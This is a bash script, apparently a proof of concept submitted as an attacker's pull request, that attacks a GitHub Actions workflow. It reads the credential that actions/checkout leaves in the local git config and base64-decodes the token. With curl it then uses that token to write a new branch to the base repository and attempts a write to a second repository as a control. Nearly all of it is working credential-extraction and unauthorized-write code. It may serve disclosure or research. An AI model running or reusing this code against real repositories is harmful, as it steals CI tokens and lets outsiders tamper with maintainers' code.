#!/usr/bin/env bash
# Authored by a NON-COLLABORATOR. Never reviewed. The ONLY file in the attacker's pull request.
# The workflow executing this script is the maintainer's, byte-unmodified, and carries NO env: block.
echo "T3|VERSION=ATTACKER-SUPPLIED-NEVER-REVIEWED|event=${GITHUB_EVENT_NAME:-?}|ref=${GITHUB_REF:-?}|run=${GITHUB_RUN_ID:-?}|repo=${GITHUB_REPOSITORY:-?}"

# ---- (1) BOUNDING HALF: with NO env: injection, is a repository secret visible to me at all? ----
printf 'T3|SECRET-NO-ENV-INJECTION|MQ_PROBE len=%s sha256-16=%s\n' "${#MQ_PROBE}" "$(printf %s "${MQ_PROBE:-}" | sha256sum | cut -c1-16)"
printf 'T3|EMPTY-STRING-REFERENCE|sha256-16=%s\n' "$(printf %s '' | sha256sum | cut -c1-16)"
printf 'T3|GITHUB_TOKEN-ENV|len=%s\n' "${#GITHUB_TOKEN}"

# ---- (2) THE STRONGER HALF: actions/checkout at its DEFAULTS persists a credential in the workspace ----
H=$(git config --local --get 'http.https://github.com/.extraheader' 2>/dev/null || true)
printf 'T3|EXTRAHEADER-PRESENT|len=%s sha256-16=%s\n' "${#H}" "$(printf %s "${H:-}" | sha256sum | cut -c1-16)"
B=$(printf %s "${H:-}" | awk '{print $3}')
T=$(printf %s "${B:-}" | base64 -d 2>/dev/null | cut -d: -f2-)
printf 'T3|TOKEN-EXTRACTED|len=%s typeprefix=%s sha256-16=%s\n' "${#T}" "${T:0:4}" "$(printf %s "${T:-}" | sha256sum | cut -c1-16)"

# ---- (3) THE IMPACT BYTE: use ONLY the extracted credential to WRITE to the base repository ----
# Deliberately NOT ${{ secrets.GITHUB_TOKEN }} (the attacker has no workflow file and cannot add one)
# and NOT $GITHUB_TOKEN (never exported). The only credential in play is the one checkout left behind.
R=$(curl -s -o /tmp/t3o -w '%{http_code}' -X POST \
  -H "Authorization: token ${T}" -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/${GITHUB_REPOSITORY}/git/refs" \
  -d "{\"ref\":\"refs/heads/t3-${GITHUB_RUN_ID}\",\"sha\":\"${GITHUB_SHA}\"}")
echo "T3|WRITE-WITH-EXTRACTED-TOKEN|POST /git/refs refs/heads/t3-${GITHUB_RUN_ID} -> HTTP ${R}"
echo "T3|WRITE-BODY|$(head -c 400 /tmp/t3o | tr -d '\n')"

# ---- (4) NEGATIVE CONTROL in the same job: the same credential against a DIFFERENT repository ----
R2=$(curl -s -o /tmp/t3o2 -w '%{http_code}' -X PUT \
  -H "Authorization: token ${T}" -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/kovac-labs/zz-victim-pkg-1027/contents/t3-probe.txt" \
  -d "{\"message\":\"probe\",\"content\":\"eA==\"}")
echo "T3|CROSS-REPO-NEGATIVE-CONTROL|PUT contents on kovac-labs/zz-victim-pkg-1027 -> HTTP ${R2}"
echo "T3|WHOAMI|the workflow file executing me is the maintainer's, byte-unmodified, with NO env: block and NO secrets reference"
